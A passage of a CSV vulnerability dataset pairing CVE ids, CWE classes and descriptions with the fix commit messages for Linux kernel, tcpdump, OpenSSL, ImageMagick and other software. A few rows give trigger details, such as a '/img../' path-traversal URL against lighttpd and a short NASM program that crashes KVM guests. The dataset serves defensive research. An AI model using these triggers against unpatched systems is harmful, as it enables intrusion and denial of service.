Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2018-19052,CWE-22,2018-11-07,"An issue was discovered in mod_alias_physical_handler in mod_alias.c in lighttpd before 1.4.50. There is potential ../ path traversal of a single directory above an alias target, with a specific mod_alias configuration where the matched alias lacks a trailing '/' character, but the alias target filesystem path does have a trailing '/' character.","Security: potential path traversal of a single directory above the alias target with a specific mod_alias config where the alias which is matched does not end in '/', but alias target filesystem path does end in '/'.  e.g. server.docroot = ""/srv/www/host/HOSTNAME/docroot""      alias.url = ( ""/img"" => ""/srv/www/hosts/HOSTNAME/images/"" )  If a malicious URL ""/img../"" were passed, the request would be for directory ""/srv/www/hosts/HOSTNAME/images/../"" which would resolve to ""/srv/www/hosts/HOSTNAME/"".  If mod_dirlisting were enabled, which is not the default, this would result in listing the contents of the directory above the alias.  An attacker might also try to directly access files anywhere under that path, which is one level above the intended aliased path.  credit: Orange Tsai(@orange_8361) from DEVCORE"
CVE-2018-14464,CWE-125,2019-10-03,The LMP parser in tcpdump before 4.9.3 has a buffer over-read in print-lmp.c:lmp_print_data_link_subobjs().,"In lmp_print_data_link_subobjs().  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2016-9601,CWE-119,2018-04-24,"ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.",
CVE-2018-19198,CWE-787,2018-11-12,An issue was discovered in uriparser before 0.9.0. UriQuery.c allows an out-of-bounds write via a uriComposeQuery* or uriComposeQueryEx* function because the '&' character is mishandled in certain contexts.,Reported by Google Autofuzz team
CVE-2013-7455,,2016-05-07,Double free vulnerability in the DefaultICCintents function in cmscnvrt.c in liblcms2 in Little CMS 2.x before 2.6 allows remote attackers to execute arbitrary code via a malformed ICC profile that triggers an error in the default intent handler.,
CVE-2016-10248,CWE-476,2017-03-15,The jpc_tsfb_synthesize function in jpc_tsfb.c in JasPer before 1.900.9 allows remote attackers to cause a denial of service (NULL pointer dereference) via vectors involving an empty sequence.,Modified the jpc_tsfb_synthesize function so that it will be a noop for an empty sequence (in order to avoid dereferencing a null pointer).
CVE-2016-4809,CWE-20,2016-09-21,The archive_read_format_cpio_read_header function in archive_read_support_format_cpio.c in libarchive before 3.2.1 allows remote attackers to cause a denial of service (application crash) via a CPIO archive with a large symlink.,
CVE-2017-18222,CWE-119,2018-03-08,"In the Linux kernel before 4.12, Hisilicon Network Subsystem (HNS) does not consider the ETH_SS_PRIV_FLAGS case when retrieving sset_count data, which allows local users to cause a denial of service (buffer overflow and memory corruption) or possibly have unspecified other impact, as demonstrated by incompatibility between hns_get_sset_count and ethtool_get_strings.","hns_get_sset_count() returns HNS_NET_STATS_CNT and the data space allocated is not enough for ethtool_get_strings(), which will cause random memory corruption.  When SLAB and DEBUG_SLAB are both enabled, memory corruptions like the the following can be observed without this patch: [   43.115200] Slab corruption (Not tainted): Acpi-ParseExt start=ffff801fb0b69030, len=80 [   43.115206] Redzone: 0x9f911029d006462/0x5f78745f31657070. [   43.115208] Last user: [<5f7272655f746b70>](0x5f7272655f746b70) [   43.115214] 010: 70 70 65 31 5f 74 78 5f 70 6b 74 00 6b 6b 6b 6b  ppe1_tx_pkt.kkkk [   43.115217] 030: 70 70 65 31 5f 74 78 5f 70 6b 74 5f 6f 6b 00 6b  ppe1_tx_pkt_ok.k [   43.115218] Next obj: start=ffff801fb0b69098, len=80 [   43.115220] Redzone: 0x706d655f6f666966/0x9f911029d74e35b. [   43.115229] Last user: [<ffff0000084b11b0>](acpi_os_release_object+0x28/0x38) [   43.115231] 000: 74 79 00 6b 6b 6b 6b 6b 70 70 65 31 5f 74 78 5f  ty.kkkkkppe1_tx_ [   43.115232] 010: 70 6b 74 5f 65 72 72 5f 63 73 75 6d 5f 66 61 69  pkt_err_csum_fai  Signed-off-by: Timmy Li <lixiaoping3@huawei.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-6903,,2017-03-14,"In ioquake3 before 2017-03-14, the auto-downloading feature has insufficient content restrictions. This also affects Quake III Arena, OpenArena, OpenJK, iortcw, and other id Tech 3 (aka Quake 3 engine) forks. A malicious auto-downloaded file can trigger loading of crafted auto-downloaded files as native code DLLs. A malicious auto-downloaded file can contain configuration defaults that override the user's. Executable bytecode in a malicious auto-downloaded file can set configuration variables to values that will result in unwanted native code DLLs being loaded, resulting in sandbox escape.","Don't load .pk3s as .dlls, and don't load user config files from .pk3s."
CVE-2018-9275,CWE-200,2018-04-04,"In check_user_token in util.c in the Yubico PAM module (aka pam_yubico) 2.18 through 2.25, successful logins can leak file descriptors to the auth mapping file, which can lead to information disclosure (serial number of a device) and/or DoS (reaching the maximum number of file descriptors).",fixes #136
CVE-2013-6383,CWE-264,2013-11-27,"The aac_compat_ioctl function in drivers/scsi/aacraid/linit.c in the Linux kernel before 3.11.8 does not require the CAP_SYS_RAWIO capability, which allows local users to bypass intended access restrictions via a crafted ioctl call.",In commit d496f94 ('[SCSI] aacraid: fix security weakness') we added a check on CAP_SYS_RAWIO to the ioctl.  The compat ioctls need the check as well.  Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2015-8958,CWE-125,2017-04-20,coders/sun.c in ImageMagick before 6.9.0-4 Beta allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted SUN file.,
CVE-2013-7448,CWE-22,2016-02-23,Directory traversal vulnerability in wiki.c in didiwiki allows remote attackers to read arbitrary files via the page parameter to api/page/get.,
CVE-2016-6911,CWE-125,2017-01-26,The dynamicGetbuf function in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted TIFF image.,"tiff_invalid_read.tiff is corrupt, and causes an invalid read in gdImageCreateFromTiffPtr(), but not in gdImageCreateFromTiff(). The culprit is dynamicGetbuf(), which doesn't check for out-of-bound reads. In this case, dynamicGetbuf() is called with a negative dp->pos, but also positive buffer overflows have to be handled, in which case 0 has to be returned (cf. commit 75e29a9).  Fixing dynamicGetbuf() exhibits that the corrupt TIFF would still create the image, because the return value of TIFFReadRGBAImage() is not checked. We do that, and let createFromTiffRgba() fail if TIFFReadRGBAImage() fails.  This issue had been reported by Ibrahim El-Sayed to security@libgd.org.  CVE-2016-6911"
CVE-2015-3331,CWE-119,2015-05-27,"The __driver_rfc4106_decrypt function in arch/x86/crypto/aesni-intel_glue.c in the Linux kernel before 3.19.3 does not properly determine the memory locations used for encrypted data, which allows context-dependent attackers to cause a denial of service (buffer overflow and system crash) or possibly execute arbitrary code by triggering a crypto API call, as demonstrated by use of a libkcapi test program with an AF_ALG(aead) socket.","The kernel crypto API logic requires the caller to provide the length of (ciphertext || authentication tag) as cryptlen for the AEAD decryption operation. Thus, the cipher implementation must calculate the size of the plaintext output itself and cannot simply use cryptlen.  The RFC4106 GCM decryption operation tries to overwrite cryptlen memory in req->dst. As the destination buffer for decryption only needs to hold the plaintext memory but cryptlen references the input buffer holding (ciphertext || authentication tag), the assumption of the destination buffer length in RFC4106 GCM operation leads to a too large size. This patch simply uses the already calculated plaintext size.  In addition, this patch fixes the offset calculation of the AAD buffer pointer: as mentioned before, cryptlen already includes the size of the tag. Thus, the tag does not need to be added. With the addition, the AAD will be written beyond the already allocated buffer.  Note, this fixes a kernel crash that can be triggered from user space via AF_ALG(aead) -- simply use the libkcapi test application from [1] and update it to use rfc4106-gcm-aes.  Using [1], the changes were tested using CAVS vectors to demonstrate that the crypto operation still delivers the right results.  [1] http://www.chronox.de/libkcapi.html  CC: Tadeusz Struk <tadeusz.struk@intel.com> Cc: stable@vger.kernel.org Signed-off-by: Stephan Mueller <smueller@chronox.de> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2017-17857,CWE-119,2017-12-27,The check_stack_boundary function in kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging mishandling of invalid variable stack read operations.,"Prevent indirect stack accesses at non-constant addresses, which would permit reading and corrupting spilled pointers.  Fixes: f1174f7 (""bpf/verifier: rework value tracking"") Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>"
CVE-2015-0208,,2015-03-19,The ASN.1 signature-verification implementation in the rsa_item_verify function in crypto/rsa/rsa_ameth.c in OpenSSL 1.0.2 before 1.0.2a allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via crafted RSA PSS parameters to an endpoint that uses the certificate-verification feature.,
CVE-2017-8061,CWE-119,2017-04-23,"drivers/media/usb/dvb-usb/dvb-usb-firmware.c in the Linux kernel 4.9.x and 4.10.x before 4.10.7 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","The buffer allocation for the firmware data was changed in commit 43fab97 (""[media] dvb-usb: don't use stack for firmware load"") but the same applies for the reset value.  Fixes: 43fab97 (""[media] dvb-usb: don't use stack for firmware load"") Cc: stable@vger.kernel.org Signed-off-by: Stefan Brüns <stefan.bruens@rwth-aachen.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>"
CVE-2018-11232,CWE-20,2018-05-18,The etm_setup_aux function in drivers/hwtracing/coresight/coresight-etm-perf.c in the Linux kernel before 4.10.2 allows attackers to cause a denial of service (panic) because a parameter is incorrectly used as a local variable.,"Commit d52c975 (""coresight: reset ""enable_sink"" flag when need be"") caused a kernel panic because of the using of an invalid value: after 'for_each_cpu(cpu, mask)', value of local variable 'cpu' become invalid, causes following 'cpu_to_node' access invalid memory area.  This patch brings the deleted 'cpu = cpumask_first(mask)' back.  Panic log:   $ perf record -e cs_etm// ls   Unable to handle kernel paging request at virtual address fffe801804af4f10  pgd = ffff8017ce031600  [fffe801804af4f10] *pgd=0000000000000000, *pud=0000000000000000  Internal error: Oops: 96000004 [#1] SMP  Modules linked in:  CPU: 33 PID: 1619 Comm: perf Not tainted 4.7.1+ #16  Hardware name: Huawei Taishan 2280 /CH05TEVBA, BIOS 1.10 11/24/2016  task: ffff8017cb0c8400 ti: ffff8017cb154000 task.ti: ffff8017cb154000  PC is at tmc_alloc_etf_buffer+0x60/0xd4  LR is at tmc_alloc_etf_buffer+0x44/0xd4  pc : [<ffff000008633df8>] lr : [<ffff000008633ddc>] pstate: 60000145  sp : ffff8017cb157b40  x29: ffff8017cb157b40 x28: 0000000000000000  ...skip...  7a60: ffff000008c64dc8 0000000000000006 0000000000000253 ffffffffffffffff  7a80: 0000000000000000 0000000000000000 ffff0000080872cc 0000000000000001  [<ffff000008633df8>] tmc_alloc_etf_buffer+0x60/0xd4  [<ffff000008632b9c>] etm_setup_aux+0x1dc/0x1e8  [<ffff00000816eed4>] rb_alloc_aux+0x2b0/0x338  [<ffff00000816a5e4>] perf_mmap+0x414/0x568  [<ffff0000081ab694>] mmap_region+0x324/0x544  [<ffff0000081abbe8>] do_mmap+0x334/0x3e0  [<ffff000008191150>] vm_mmap_pgoff+0xa4/0xc8  [<ffff0000081a9a30>] SyS_mmap_pgoff+0xb0/0x22c  [<ffff0000080872e4>] sys_mmap+0x18/0x28  [<ffff0000080843f0>] el0_svc_naked+0x24/0x28  Code: 912040a5 d0001c00 f873d821 911c6000 (b8656822)  ---[ end trace 98933da8f92b0c9a ]---  Signed-off-by: Wang Nan <wangnan0@huawei.com> Cc: Xia Kaixu <xiakaixu@huawei.com> Cc: Li Zefan <lizefan@huawei.com> Cc: Mathieu Poirier <mathieu.poirier@linaro.org> Cc: linux-arm-kernel@lists.infradead.org Cc: linux-kernel@vger.kernel.org Fixes: d52c975 (""coresight: reset ""enable_sink"" flag when need be"") Signed-off-by: Mathieu Poirier <mathieu.poirier@linaro.org> Cc: stable <stable@vger.kernel.org> # 4.10 Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2018-16230,CWE-125,2019-10-03,The BGP parser in tcpdump before 4.9.3 has a buffer over-read in print-bgp.c:bgp_attr_print() (MP_REACH_NLRI).,"When bgp_attr_print() tried to decode the variable-length nexthop value for the NSAP VPN case, it did not check that the declared length is good to interpret the value as a mapped IPv4 or IPv6 address. Add missing checks to make this safe.  This fixes a buffer over-read discovered by Include Security working under the Mozilla SOS program in 2018 by means of code audit.  Bhargava Shastry, SecT/TU Berlin, had independently identified this vulnerability by means of fuzzing and provided the packet capture file for the test."
CVE-2018-16228,CWE-125,2019-10-03,The HNCP parser in tcpdump before 4.9.3 has a buffer over-read in print-hncp.c:print_prefix().,"print_prefix() has a buffer and does not initialize it. It may call decode_prefix6(), which also does not initialize the buffer on invalid input. When that happens, make sure to return from print_prefix() before trying to print the [still uninitialized] buffer.  This fixes a buffer over-read discovered by Wang Junjie of 360 ESG Codesafe Team.  Add a test using the capture file supplied by the reporter(s)."
CVE-2012-0045,,2012-07-03,"The em_syscall function in arch/x86/kvm/emulate.c in the KVM implementation in the Linux kernel before 3.2.14 does not properly handle the 0f05 (aka syscall) opcode, which allows guest OS users to cause a denial of service (guest OS crash) via a crafted application, as demonstrated by an NASM file.","On hosts without this patch, 32bit guests will crash (and 64bit guests may behave in a wrong way) for example by simply executing following nasm-demo-application:      [bits 32]     global _start     SECTION .text     _start: syscall  (I tested it with winxp and linux - both always crashed)      Disassembly of section .text:      00000000 <_start>:        0:   0f 05                   syscall  The reason seems a missing ""invalid opcode""-trap (int6) for the syscall opcode ""0f05"", which is not available on Intel CPUs within non-longmodes, as also on some AMD CPUs within legacy-mode. (depending on CPU vendor, MSR_EFER and cpuid)  Because previous mentioned OSs may not engage corresponding syscall target-registers (STAR, LSTAR, CSTAR), they remain NULL and (non trapping) syscalls are leading to multiple faults and finally crashs.  Depending on the architecture (AMD or Intel) pretended by guests, various checks according to vendor's documentation are implemented to overcome the current issue and behave like the CPUs physical counterparts.  [mtosatti: cleanup/beautify code]  Signed-off-by: Stephan Baerwolf <stephan.baerwolf@tu-ilmenau.de> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>"
CVE-2017-13695,CWE-200,2017-08-25,"The acpi_ns_evaluate() function in drivers/acpi/acpica/nseval.c in the Linux kernel through 4.12.9 does not flush the operand cache and causes a kernel stack dump, which allows local users to obtain sensitive information from kernel memory and bypass the KASLR protection mechanism (in the kernel through 4.9) via a crafted ACPI table.",
CVE-2017-14140,CWE-200,2017-09-05,"The move_pages system call in mm/migrate.c in the Linux kernel before 4.12.9 doesn't check the effective uid of the target process, enabling a local attacker to learn the memory layout of a setuid executable despite ASLR.","The 'move_paghes()' system call was introduced long long ago with the same permission checks as for sending a signal (except using CAP_SYS_NICE instead of CAP_SYS_KILL for the overriding capability).  That turns out to not be a great choice - while the system call really only moves physical page allocations around (and you need other capabilities to do a lot of it), you can check the return value to map out some the virtual address choices and defeat ASLR of a binary that still shares your uid.  So change the access checks to the more common 'ptrace_may_access()' model instead.  This tightens the access checks for the uid, and also effectively changes the CAP_SYS_NICE check to CAP_SYS_PTRACE, but it's unlikely that anybody really _uses_ this legacy system call any more (we hav ebetter NUMA placement models these days), so I expect nobody to notice.  Famous last words.  Reported-by: Otto Ebeling <otto.ebeling@iki.fi> Acked-by: Eric W. Biederman <ebiederm@xmission.com> Cc: Willy Tarreau <w@1wt.eu> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2013-7027,CWE-119,2013-12-09,"The ieee80211_radiotap_iterator_init function in net/wireless/radiotap.c in the Linux kernel before 3.11.7 does not check whether a frame contains any data outside of the header, which might allow attackers to cause a denial of service (buffer over-read) via a crafted header.","When parsing an invalid radiotap header, the parser can overrun the buffer that is passed in because it doesn't correctly check  1) the minimum radiotap header size  2) the space for extended bitmaps  The first issue doesn't affect any in-kernel user as they all check the minimum size before calling the radiotap function. The second issue could potentially affect the kernel if an skb is passed in that consists only of the radiotap header with a lot of extended bitmaps that extend past the SKB. In that case a read-only buffer overrun by at most 4 bytes is possible.  Fix this by adding the appropriate checks to the parser.  Cc: stable@vger.kernel.org Reported-by: Evan Huus <eapache@gmail.com> Signed-off-by: Johannes Berg <johannes.berg@intel.com>"
CVE-2013-3230,CWE-200,2013-04-22,"The l2tp_ip6_recvmsg function in net/l2tp/l2tp_ip6.c in the Linux kernel before 3.9-rc7 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.",The L2TP code for IPv6 fails to initialize the l2tp_conn_id member of struct sockaddr_l2tpip6 and therefore leaks four bytes kernel stack in l2tp_ip6_recvmsg() in case msg_name is set.  Initialize l2tp_conn_id with 0 to avoid the info leak.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2015-0288,,2015-03-19,"The X509_to_X509_REQ function in crypto/x509/x509_req.c in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a might allow attackers to cause a denial of service (NULL pointer dereference and application crash) via an invalid certificate key.",
CVE-2014-0185,CWE-269,2014-05-06,"sapi/fpm/fpm/fpm_unix.c in the FastCGI Process Manager (FPM) in PHP before 5.4.28 and 5.5.x before 5.5.12 uses 0666 permissions for the UNIX socket, which allows local users to gain privileges via a crafted FastCGI client.",
CVE-2014-9922,CWE-264,2017-04-04,"The eCryptfs subsystem in the Linux kernel before 3.18 allows local users to gain privileges via a large filesystem stack that includes an overlayfs layer, related to fs/ecryptfs/main.c and fs/overlayfs/super.c.","Add a simple read-only counter to super_block that indicates how deep this is in the stack of filesystems.  Previously ecryptfs was the only stackable filesystem and it explicitly disallowed multiple layers of itself.  Overlayfs, however, can be stacked recursively and also may be stacked on top of ecryptfs or vice versa.  To limit the kernel stack usage we must limit the depth of the filesystem stack.  Initially the limit is set to 2.  Signed-off-by: Miklos Szeredi <mszeredi@suse.cz>"
CVE-2014-3184,CWE-119,2014-09-28,"The report_fixup functions in the HID subsystem in the Linux kernel before 3.16.2 might allow physically proximate attackers to cause a denial of service (out-of-bounds write) via a crafted device that provides a small report descriptor, related to (1) drivers/hid/hid-cherry.c, (2) drivers/hid/hid-kye.c, (3) drivers/hid/hid-lg.c, (4) drivers/hid/hid-monterey.c, (5) drivers/hid/hid-petalynx.c, and (6) drivers/hid/hid-sunplus.c.",There are a few very theoretical off-by-one bugs in report descriptor size checking when performing a pre-parsing fixup. Fix those.  Cc: stable@vger.kernel.org Reported-by: Ben Hawkes <hawkes@google.com> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>
CVE-2014-6269,CWE-189,2014-09-30,"Multiple integer overflows in the http_request_forward_body function in proto_http.c in HAProxy 1.5-dev23 before 1.5.4 allow remote attackers to cause a denial of service (crash) via a large stream of data, which triggers a buffer overflow and an out-of-bounds read.",
CVE-2016-9389,,2017-03-23,The jpc_irct and jpc_iict functions in jpc_mct.c in JasPer before 1.900.14 allow remote attackers to cause a denial of service (assertion failure).,"This was previously enforced with an assertion. Now, it is handled in a more graceful manner."
CVE-2015-6252,CWE-399,2015-10-19,The vhost_dev_ioctl function in drivers/vhost/vhost.c in the Linux kernel before 4.1.5 allows local users to cause a denial of service (memory consumption) via a VHOST_SET_LOG_FD ioctl call that triggers permanent file-descriptor allocation.,"While reviewing vhost log code, I found out that log_file is never set. Note: I haven't tested the change (QEMU doesn't use LOG_FD yet).  Cc: stable@vger.kernel.org Signed-off-by: Marc-André Lureau <marcandre.lureau@redhat.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com>"
CVE-2017-6387,CWE-125,2017-03-02,The dex_loadcode function in libr/bin/p/bin_dex.c in radare2 1.2.1 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted DEX file.,
CVE-2018-20846,CWE-20,2019-06-26,"Out-of-bounds accesses in the functions pi_next_lrcp, pi_next_rlcp, pi_next_rpcl, pi_next_pcrl, pi_next_rpcl, and pi_next_cprl in openmj2/pi.c in OpenJPEG through 2.3.0 allow remote attackers to cause a denial of service (application crash).",
CVE-2013-1929,CWE-119,2013-06-07,Heap-based buffer overflow in the tg3_read_vpd function in drivers/net/ethernet/broadcom/tg3.c in the Linux kernel before 3.8.6 allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via crafted firmware that specifies a long string in the Vital Product Data (VPD) data structure.,"Commit 184b890 (""tg3: Use VPD fw version when present"") introduced VPD parsing that contained a potential length overflow.  Limit the hardware's reported firmware string length (max 255 bytes) to stay inside the driver's firmware string length (32 bytes). On overflow, truncate the formatted firmware string instead of potentially overwriting portions of the tg3 struct.  http://cansecwest.com/slides/2013/PrivateCore%20CSW%202013.pdf  Signed-off-by: Kees Cook <keescook@chromium.org> Reported-by: Oded Horovitz <oded@privatecore.com> Reported-by: Brad Spengler <spender@grsecurity.net> Cc: stable@vger.kernel.org Cc: Matt Carlson <mcarlson@broadcom.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-10165,CWE-125,2017-02-03,"The Type_MLU_Read function in cmstypes.c in Little CMS (aka lcms2) allows remote attackers to obtain sensitive information or cause a denial of service via an image with a crafted ICC profile, which triggers an out-of-bounds heap read.",Thanks to Ibrahim el-sayed for spotting the bug
CVE-2013-3222,CWE-200,2013-04-22,"The vcc_recvmsg function in net/atm/common.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","The current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.  Fix that by simply setting msg_namelen to 0 as obviously nobody cared about vcc_recvmsg() not filling the msg_name in case it was set.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-9578,CWE-908,2019-03-05,"In devs.c in Yubico libu2f-host before 1.1.8, the response to init is misparsed, leaking uninitialized stack memory back to the device.",
CVE-2019-1010298,CWE-190,2019-07-15,Linaro/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Buffer Overflow. The impact is: Code execution in the context of TEE core (kernel). The component is: optee_os. The fixed version is: 3.4.0 and later.,"Without checking for overflow there is a risk of allocating a buffer with size smaller than anticipated and as a consequence of that it might lead to a heap based overflow with attacker controlled data written outside the boundaries of the buffer.  Fixes: OP-TEE-2018-0011: ""Integer overflow in crypto system calls (x2)""  Signed-off-by: Joakim Bech <joakim.bech@linaro.org> Tested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8) Reviewed-by: Jens Wiklander <jens.wiklander@linaro.org> Reported-by: Riscure <inforequest@riscure.com> Reported-by: Alyssa Milburn <a.a.milburn@vu.nl> Acked-by: Etienne Carriere <etienne.carriere@linaro.org>"
CVE-2017-18224,CWE-362,2018-03-12,"In the Linux kernel before 4.15, fs/ocfs2/aops.c omits use of a semaphore and consequently has a race condition for access to the extent tree during read operations in DIRECT mode, which allows local users to cause a denial of service (BUG) by modifying a certain e_cpos field.","ip_alloc_sem should be taken in ocfs2_get_block() when reading file in DIRECT mode to prevent concurrent access to extent tree with ocfs2_dio_end_io_write(), which may cause BUGON in the following situation:  read file 'A'                                  end_io of writing file 'A' vfs_read  __vfs_read   ocfs2_file_read_iter    generic_file_read_iter     ocfs2_direct_IO      __blockdev_direct_IO       do_blockdev_direct_IO        do_direct_IO         get_more_blocks          ocfs2_get_block           ocfs2_extent_map_get_blocks            ocfs2_get_clusters             ocfs2_get_clusters_nocache()              ocfs2_search_extent_list               return the index of record which               contains the v_cluster, that is               v_cluster > rec[i]->e_cpos.                                                 ocfs2_dio_end_io                                                  ocfs2_dio_end_io_write                                                   down_write(&oi->ip_alloc_sem);                                                   ocfs2_mark_extent_written                                                    ocfs2_change_extent_flag                                                     ocfs2_split_extent                                                      ...                                                  --> modify the rec[i]->e_cpos, resulting                                                      in v_cluster < rec[i]->e_cpos.              BUG_ON(v_cluster < le32_to_cpu(rec->e_cpos))  [alex.chen@huawei.com: v3]   Link: http://lkml.kernel.org/r/59EF3614.6050008@huawei.com Link: http://lkml.kernel.org/r/59EF3614.6050008@huawei.com Fixes: c15471f (""ocfs2: fix sparse file & data ordering issue in direct io"") Signed-off-by: Alex Chen <alex.chen@huawei.com> Reviewed-by: Jun Piao <piaojun@huawei.com> Reviewed-by: Joseph Qi <jiangqi903@gmail.com> Reviewed-by: Gang He <ghe@suse.com> Acked-by: Changwei Ge <ge.changwei@h3c.com> Cc: Mark Fasheh <mfasheh@versity.com> Cc: Joel Becker <jlbec@evilplan.org> Cc: Junxiao Bi <junxiao.bi@oracle.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2019-11472,CWE-369,2019-04-23,ReadXWDImage in coders/xwd.c in the XWD image parsing component of ImageMagick 7.0.8-41 Q16 allows attackers to cause a denial-of-service (divide-by-zero error) by crafting an XWD image file in which the header indicates neither LSB first nor MSB first.,
CVE-2019-12110,CWE-476,2019-05-15,An AddPortMapping Denial Of Service vulnerability in MiniUPnP MiniUPnPd through 2.1 exists due to a NULL pointer dereference in upnpredirect.c.,
CVE-2014-3587,CWE-189,2014-08-23,"Integer overflow in the cdf_read_property_info function in cdf.c in file through 5.19, as used in the Fileinfo component in PHP before 5.4.32 and 5.5.x before 5.5.16, allows remote attackers to cause a denial of service (application crash) via a crafted CDF file.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2012-1571.",
CVE-2018-21017,CWE-401,2019-09-16,GPAC 0.7.1 has a memory leak in dinf_Read in isomedia/box_code_base.c.,
CVE-2016-2180,CWE-125,2016-08-01,"The TS_OBJ_print_bio function in crypto/ts/ts_lib.c in the X.509 Public Key Infrastructure Time-Stamp Protocol (TSP) implementation in OpenSSL through 1.0.2h allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted time-stamp file that is mishandled by the ""openssl ts"" command.",TS_OBJ_print_bio() misuses OBJ_txt2obj: it should print the result as a null terminated buffer. The length value returned is the total length the complete text reprsentation would need not the amount of data written.  CVE-2016-2180  Thanks to Shi Lei for reporting this bug.  Reviewed-by: Matt Caswell <matt@openssl.org>
CVE-2016-8689,CWE-125,2017-02-15,The read_Header function in archive_read_support_format_7zip.c in libarchive 3.2.1 allows remote attackers to cause a denial of service (out-of-bounds read) via multiple EmptyStream attributes in a header in a 7zip archive.,"The sample file that demonstrated this had multiple 'EmptyStream' attributes.  The first one ended up being used to calculate certain statistics, then was overwritten by the second which was incompatible with those statistics.  The fix here is to reject any header with multiple EmptyStream attributes.  While here, also reject headers with multiple EmptyFile, AntiFile, Name, or Attributes markers."
CVE-2017-7277,CWE-125,2017-03-28,"The TCP stack in the Linux kernel through 4.10.6 mishandles the SCM_TIMESTAMPING_OPT_STATS feature, which allows local users to obtain sensitive information from the kernel's internal socket data structures or cause a denial of service (out-of-bounds read) via crafted system calls, related to net/core/skbuff.c and net/socket.c.","__sock_recv_timestamp can be called for both normal skbs (for receive timestamps) and for skbs on the error queue (for transmit timestamps).  Commit 1c88580 (tcp: SOF_TIMESTAMPING_OPT_STATS option for SO_TIMESTAMPING) assumes any skb passed to __sock_recv_timestamp are from the error queue, containing OPT_STATS in the content of the skb. This results in accessing invalid memory or generating junk data.  To fix this, set skb->pkt_type to PACKET_OUTGOING for packets on the error queue. This is safe because on the receive path on local sockets skb->pkt_type is never set to PACKET_OUTGOING. With that, copy OPT_STATS from a packet, only if its pkt_type is PACKET_OUTGOING.  Fixes: 1c88580 (""tcp: SOF_TIMESTAMPING_OPT_STATS option for SO_TIMESTAMPING"") Reported-by: JongHwan Kim <zzoru007@gmail.com> Signed-off-by: Soheil Hassas Yeganeh <soheil@google.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: Willem de Bruijn <willemb@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-7163,CWE-190,2016-09-21,"Integer overflow in the opj_pi_create_decode function in pi.c in OpenJPEG allows remote attackers to execute arbitrary code via a crafted JP2 file, which triggers an out-of-bounds read or write.",Prevent an integer overflow issue in function opj_pi_create_decode of pi.c.
CVE-2013-3226,CWE-200,2013-04-22,"The sco_sock_recvmsg function in net/bluetooth/sco.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","If the socket is in state BT_CONNECT2 and BT_SK_DEFER_SETUP is set in the flags, sco_sock_recvmsg() returns early with 0 without updating the possibly set msg_namelen member. This, in turn, leads to a 128 byte kernel stack leak in net/socket.c.  Fix this by updating msg_namelen in this case. For all other cases it will be handled in bt_sock_recvmsg().  Cc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2012-3291,CWE-119,2012-06-07,Heap-based buffer overflow in OpenConnect 3.18 allows remote servers to cause a denial of service via a crafted greeting banner.,
